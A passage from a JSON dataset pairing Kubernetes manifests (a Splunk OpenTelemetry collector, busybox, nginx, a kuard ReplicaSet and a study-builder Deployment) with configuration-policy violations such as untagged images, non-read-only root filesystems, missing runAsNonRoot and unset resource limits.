LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prepare-fluentd-config\" has memory limit 0"
  },
  {
    "id": "01500",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"failing-pod\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01501",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"failing-pod\" does not have a read-only root file system"
  },
  {
    "id": "01502",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"failing-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "01503",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"failing-pod\" has cpu request 0"
  },
  {
    "id": "01504",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"failing-pod\" has memory limit 0"
  },
  {
    "id": "01505",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"queue\" does not have a read-only root file system"
  },
  {
    "id": "01506",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"queue\" is not set to runAsNonRoot"
  },
  {
    "id": "01507",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"queue\" has cpu request 0"
  },
  {
    "id": "01508",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"queue\" has memory limit 0"
  },
  {
    "id": "01509",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01510",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01511",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01512",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01513",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01514",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cloudsql-proxy\" is using an invalid container image, \"gcr.io/cloudsql-docker/gce-proxy:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01515",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"study-builder\" is using an invalid container image, \"gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01516",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cloudsql-proxy\" does not have a read-only root file system"
  },
  {
    "id": "01517",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"study-builder\" does not have a read-only root file system"
  },
  {
    "id": "01518",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cloudsql-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "01519",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
